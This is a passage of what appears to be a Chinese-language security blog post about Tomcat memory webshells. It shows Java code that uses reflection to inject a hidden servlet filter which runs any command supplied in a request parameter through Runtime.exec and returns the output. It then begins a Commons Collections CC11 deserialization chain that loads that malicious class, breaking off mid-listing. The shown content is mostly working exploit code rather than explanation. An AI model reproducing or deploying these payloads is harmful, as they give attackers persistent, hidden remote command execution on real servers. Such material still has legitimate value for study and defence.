</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">static</span> String FILTER_URL_PATTERN = <span style="color:#0ff;font-weight:bold">&#34;/*&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">static</span> String FILTER_NAME = <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">static</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            javax.<span style="color:#007f7f">servlet</span>.<span style="color:#007f7f">ServletContext</span> servletContext = getServletContext();
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span>(servletContext != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">StandardContext</span> standardContext = <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#007f7f">// 判断该filter 是否已存在
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                <span style="color:#fff;font-weight:bold">if</span>(servletContext.<span style="color:#007f7f">getFilterRegistration</span>(FILTER_NAME) == <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                    java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> ctx = servletContext.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;context&#34;</span>);
</span></span><span style="display:flex;"><span>                    ctx.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>                    ApplicationContext applicationContext = (ApplicationContext) ctx.<span style="color:#007f7f">get</span>(servletContext);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> stdctx = applicationContext.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;context&#34;</span>);
</span></span><span style="display:flex;"><span>                    stdctx.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>                    standardContext = (StandardContext) stdctx.<span style="color:#007f7f">get</span>(applicationContext);
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">if</span>(standardContext != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">//修改状态，要不然调用addFilter方法没有效果
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> stateField = org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">LifecycleBase</span>.<span style="color:#007f7f">class</span>
</span></span><span style="display:flex;"><span>                                .<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;state&#34;</span>);
</span></span><span style="display:flex;"><span>                        stateField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>                        stateField.<span style="color:#007f7f">set</span>(standardContext, org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">LifecycleState</span>.<span style="color:#007f7f">STARTING_PREP</span>);
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">//创建一个自定义的Filter马
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        Filter filter = <span style="color:#fff;font-weight:bold">new</span> TomcatShellInject();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">// 调用addFilter 方法添加
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        javax.<span style="color:#007f7f">servlet</span>.<span style="color:#007f7f">FilterRegistration</span>.<span style="color:#007f7f">Dynamic</span> filterRegistration = servletContext.<span style="color:#007f7f">addFilter</span>(FILTER_NAME,filter);
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">// 进行一些简单的设置
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        filterRegistration.<span style="color:#007f7f">setInitParameter</span>(<span style="color:#0ff;font-weight:bold">&#34;encoding&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;utf-8&#34;</span>);
</span></span><span style="display:flex;"><span>                        filterRegistration.<span style="color:#007f7f">setAsyncSupported</span>(<span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">// 设置基本的url pattern
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        filterRegistration.<span style="color:#007f7f">addMappingForUrlPatterns</span>(java.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">EnumSet</span>.<span style="color:#007f7f">of</span>(javax.<span style="color:#007f7f">servlet</span>.<span style="color:#007f7f">DispatcherType</span>.<span style="color:#007f7f">REQUEST</span>),<span style="color:#fff;font-weight:bold">false</span>,<span style="color:#fff;font-weight:bold">new</span> String[]{FILTER_URL_PATTERN});
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">// 回复状态，使服务正常使用
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        <span style="color:#fff;font-weight:bold">if</span>(stateField != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                            stateField.<span style="color:#007f7f">set</span>(standardContext,org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">LifecycleState</span>.<span style="color:#007f7f">STARTED</span>);
</span></span><span style="display:flex;"><span>                        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">// 在设置之后我们需要 调用 filterstart
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        <span style="color:#fff;font-weight:bold">if</span> (standardContext != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                            <span style="color:#007f7f">// 设置filter之后调用 filterstart 来启动我们的 filter
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                            java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Method</span> filterStartMethod = StandardContext.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">getDeclaredMethod</span>(<span style="color:#0ff;font-weight:bold">&#34;filterStart&#34;</span>);
</span></span><span style="display:flex;"><span>                            filterStartMethod.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>                            filterStartMethod.<span style="color:#007f7f">invoke</span>(standardContext,<span style="color:#fff;font-weight:bold">null</span>);
</span></span><span style="display:flex;"><span>                        }
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> ServletContext getServletContext() <span style="color:#fff;font-weight:bold">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
</span></span><span style="display:flex;"><span>        ServletRequest servletRequest = <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">/*shell注入，前提需要能拿到request、response等*/</span>
</span></span><span style="display:flex;"><span>        Class c = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span>);
</span></span><span style="display:flex;"><span>        java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> f = c.<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;lastServicedRequest&#34;</span>);
</span></span><span style="display:flex;"><span>        f.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        ThreadLocal threadLocal = (ThreadLocal) f.<span style="color:#007f7f">get</span>(<span style="color:#fff;font-weight:bold">null</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">//不为空则意味着第一次反序列化的准备工作已成功
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (threadLocal != <span style="color:#fff;font-weight:bold">null</span> &amp;&amp; threadLocal.<span style="color:#007f7f">get</span>() != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            servletRequest = (ServletRequest) threadLocal.<span style="color:#007f7f">get</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">assert</span> servletRequest != <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        ServletContext servletContext = servletRequest.<span style="color:#007f7f">getServletContext</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span>(servletContext != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> servletContext;
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> doFilter(ServletRequest request, ServletResponse response, FilterChain chain) <span style="color:#fff;font-weight:bold">throws</span> IOException, ServletException {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;TomcatShellInject doFilter.....................................................................&#34;</span>);
</span></span><span style="display:flex;"><span>        String cmd;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> ((cmd = request.<span style="color:#007f7f">getParameter</span>(cmdParamName)) != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            Process process = Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(cmd);
</span></span><span style="display:flex;"><span>            java.<span style="color:#007f7f">io</span>.<span style="color:#007f7f">BufferedReader</span> bufferedReader = <span style="color:#fff;font-weight:bold">new</span> java.<span style="color:#007f7f">io</span>.<span style="color:#007f7f">BufferedReader</span>(
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">new</span> java.<span style="color:#007f7f">io</span>.<span style="color:#007f7f">InputStreamReader</span>(process.<span style="color:#007f7f">getInputStream</span>()));
</span></span><span style="display:flex;"><span>            StringBuilder stringBuilder = <span style="color:#fff;font-weight:bold">new</span> StringBuilder();
</span></span><span style="display:flex;"><span>            String line;
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">while</span> ((line = bufferedReader.<span style="color:#007f7f">readLine</span>()) != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                stringBuilder.<span style="color:#007f7f">append</span>(line + <span style="color:#0ff;font-weight:bold">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            response.<span style="color:#007f7f">getOutputStream</span>().<span style="color:#007f7f">write</span>(stringBuilder.<span style="color:#007f7f">toString</span>().<span style="color:#007f7f">getBytes</span>());
</span></span><span style="display:flex;"><span>            response.<span style="color:#007f7f">getOutputStream</span>().<span style="color:#007f7f">flush</span>();
</span></span><span style="display:flex;"><span>            response.<span style="color:#007f7f">getOutputStream</span>().<span style="color:#007f7f">close</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        chain.<span style="color:#007f7f">doFilter</span>(request,response);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> destroy() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, SerializationHandler[] handlers) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> init(FilterConfig filterConfig) <span style="color:#fff;font-weight:bold">throws</span> ServletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="实现">实现<a hidden class="anchor" aria-hidden="true" href="#实现">#</a></h4>
<p>使用CC11链将<code>TomatEchoInject</code>和<code>TomcatShellInject</code>两个恶意类序列化。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">69
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> Evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.commons.collections.Transformer;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.commons.collections.functors.ConstantTransformer;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.commons.collections.functors.InvokerTransformer;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.commons.collections.map.LazyMap;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.*;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.lang.reflect.Field;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.nio.file.Files;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.nio.file.Paths;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.HashMap;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Map;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName CC11
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/3/17 15:58
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> CC11 {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> setFieldValue(Object obj, String fileNmae, Object value) <span style="color:#fff;font-weight:bold">throws</span> Exception {
</span></span><span style="display:flex;"><span>        Field field = obj.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(fileNmae);
</span></span><span style="display:flex;"><span>        field.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        field.<span style="color:#007f7f">set</span>(obj,value);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> Exception {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 构造恶意 TemplatesImpl 对象
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        TemplatesImpl obj = <span style="color:#fff;font-weight:bold">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 获取恶意类的字节码
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">byte</span>[] code = Files.<span style="color:#007f7f">readAllBytes</span>(Paths.<span style="color:#007f7f">get</span>(<span style="color:#0ff;font-weight:bold">&#34;/Users/reus09/Desktop/MemoryShell/target/classes/Evil/TomcatEchoInject.class&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">byte</span>[][] codes = {code};
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 反射修改属性
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        setFieldValue(obj, <span style="color:#0ff;font-weight:bold">&#34;_bytecodes&#34;</span>, <span style="color:#fff;font-weight:bold">new</span> <span style="color:#fff;font-weight:bold">byte</span>[][] {code});
</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#0ff;font-weight:bold">&#34;_name&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;HelloTemplatesImpl&#34;</span>);
</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#0ff;font-weight:bold">&#34;_tfactory&#34;</span>, <span style="color:#fff;font-weight:bold">new</span> TransformerFactoryImpl());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ================
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#007f7f">// 利用 InvokerTransformer 调用 TemplatesImpl.newTransformer
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">//InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;newTransformer&#34;, null, null);
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
